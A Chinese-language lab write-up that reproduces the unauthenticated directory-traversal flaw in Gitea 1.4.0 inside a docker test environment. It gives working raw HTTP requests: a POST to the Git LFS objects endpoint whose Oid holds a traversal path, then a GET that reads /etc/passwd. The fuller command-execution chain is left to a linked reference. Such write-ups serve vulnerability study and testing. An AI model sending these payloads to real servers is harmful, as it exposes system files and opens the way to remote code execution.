# Gitea 1.4.0 目录穿越导致命令执行漏洞

## 漏洞描述

Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。

参考链接：

- https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
- https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html

## 环境搭建

Vulhub执行如下命令启动启动漏洞环境：

```
docker-compose up -d
```

环境启动后，访问`http://you-ip:3000`，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）

安装完成后，新建一个用户`test`，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：

![image-20220223204543045](images/202202232045145.png)

然后，需要执行一次`docker-compose restart`重启gitea服务。（原因详见第二个参考链接）

> 如果不重启的话，session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。

## 漏洞复现

由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。

打开gitea，找到刚才创建的公开项目，如`vulhub/repo`，发送如下数据包，添加一个Git LFS对象：

```
POST /test/repo.git/info/lfs/objects HTTP/1.1
Host: your-vps-ip:3000
Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 153

{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}
```

![image-20220223205223472](images/202202232052600.png)

然后，访问`http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth`，即可看到`/etc/passwd`已被成功读取：

```
GET /test/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1
Host: your-vps-ip:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20220223205318090](images/202202232053193.png)